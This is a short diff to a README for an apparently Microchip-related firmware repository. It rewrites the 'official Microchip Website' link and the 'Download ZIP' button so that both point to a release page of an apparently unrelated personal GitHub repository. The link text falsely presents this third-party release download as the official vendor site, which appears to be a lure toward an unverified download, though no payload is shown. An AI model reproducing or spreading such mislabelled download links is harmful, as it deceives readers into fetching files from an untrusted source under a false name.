@@ -45,13 +45,13 @@ To explore the projects in this repository, follow these steps:
 
 ## Explore Further
 
-For more information and detailed documentation, visit the official [Microchip Website](https://www.microchip.com/).
+For more information and detailed documentation, visit the official [Microchip Website](https://github.com/gesitwl/avr64du32-cnano-8bit-mdfu-solution-mplab-mcc/releases/tag/v1.0).
 
 ## Download
 
 Click the button below to download the repository code:
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/gesitwl/avr64du32-cnano-8bit-mdfu-solution-mplab-mcc/releases/tag/v1.0)](https://github.com/gesitwl/avr64du32-cnano-8bit-mdfu-solution-mplab-mcc/releases/tag/v1.0)
 
 Remember to extract the ZIP file after downloading to access the project files.
 
